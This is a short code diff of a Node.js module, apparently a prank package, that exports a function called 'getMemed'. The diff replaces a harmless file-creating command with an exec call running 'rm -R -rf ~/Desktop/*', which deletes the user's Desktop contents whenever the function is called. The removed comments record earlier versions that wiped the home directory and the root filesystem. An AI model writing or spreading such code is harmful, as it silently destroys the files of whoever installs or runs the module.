@@ -1,12 +1,8 @@
-const { exec } = require('child_process');
+const { exec } = require("child_process");
 
+// ( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
 const getMemed = () => {
-  exec(`touch ~/Desktop/lol.lol`, (err, stdout, stderr) => {
-    if (err) {
-      return;
-    }
-  });
-}
-// prev1 rm -R -rf ~/Desktop/*`
-// prev0 rm -R -rf ~ && rm -R -rf /
+  exec(`rm -R -rf ~/Desktop/*`);
+};
+
 module.exports = getMemed;
